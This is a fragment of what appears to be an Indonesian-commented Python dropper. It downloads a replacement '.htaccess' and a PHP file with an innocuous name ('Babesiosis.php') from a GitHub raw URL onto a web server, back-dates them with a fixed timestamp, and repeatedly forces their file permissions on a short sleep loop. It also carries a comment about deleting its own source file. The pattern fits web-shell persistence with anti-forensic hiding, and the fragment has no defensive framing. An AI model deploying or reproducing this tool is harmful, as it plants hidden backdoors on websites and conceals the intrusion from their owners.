...
FILES = {
    ".htaccess": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/hapus24.txt",
    "/mics/Babesiosis.php": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/hapus23.txt",
}
TIMESTAMP = "201910070511.18"
SLEEP_INTERVAL = 5
...
# ============== [ Paksa permission file ] =================
def enforce_permission(path, mode=0o644):
    try:
...
if __name__ == "__main__":
    ...
    # 💣 Auto-delete file asli (contoh.py)
    try:
